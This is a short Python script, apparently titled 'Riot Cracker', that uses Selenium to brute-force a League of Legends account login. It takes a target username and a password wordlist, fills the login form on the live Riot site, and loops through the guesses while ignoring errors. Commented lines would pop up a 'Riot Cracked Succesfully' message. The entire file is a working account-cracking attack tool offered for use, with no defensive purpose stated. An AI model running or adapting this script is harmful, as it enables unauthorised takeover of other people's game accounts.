from selenium import webdriver
import os
import time

try:

    usr_username = str(
        input("Kullanıcı Adı : ")
    )
    wlist = str(
        input("Wordlist  : ")
    )


    browser = webdriver.Firefox()
    url = "https://na.leagueoflegends.com/tr-tr/"

    browser.get(url)
    time.sleep(2)

    anasayfa = browser.find_element_by_xpath('//*[@id="riotbar-account"]/div[1]/a')

    anasayfa.click()

    
    # __main__
    time.sleep(2)
    site_usr    = browser.find_element_by_xpath("/html/body/div/div/div/div[2]/div[1]/div/div[2]/div/div/div/div[1]/div/input")
    site_passwd = browser.find_element_by_xpath("/html/body/div/div/div/div[2]/div[1]/div/div[2]/div/div/div/div[2]/div/input")
    site_giris  = browser.find_element_by_xpath("/html/body/div/div/div/div[2]/div[1]/div/button")
    
    
    while True:
        with open(wlist,"r",encoding="UTF-8") as param_wordlist:
            for password in param_wordlist:
                try:
                    site_usr.clear()
                    site_passwd.clear()

                    site_usr.send_keys(usr_username)
                    site_passwd.send_keys(password)

                    site_giris.click()

                    time.sleep(3)

                except Exception :
                    pass
                    # os.system('(echo MsgBox "Riot Cracked Succesfully" ^& vbCrLf ^& "coded by root@ebby:~#",262192, "RİOT CRACKER")> File.vbs')

                    # os.system('start File.vbs')

                    


except KeyboardInterrupt:
    pass
    #break


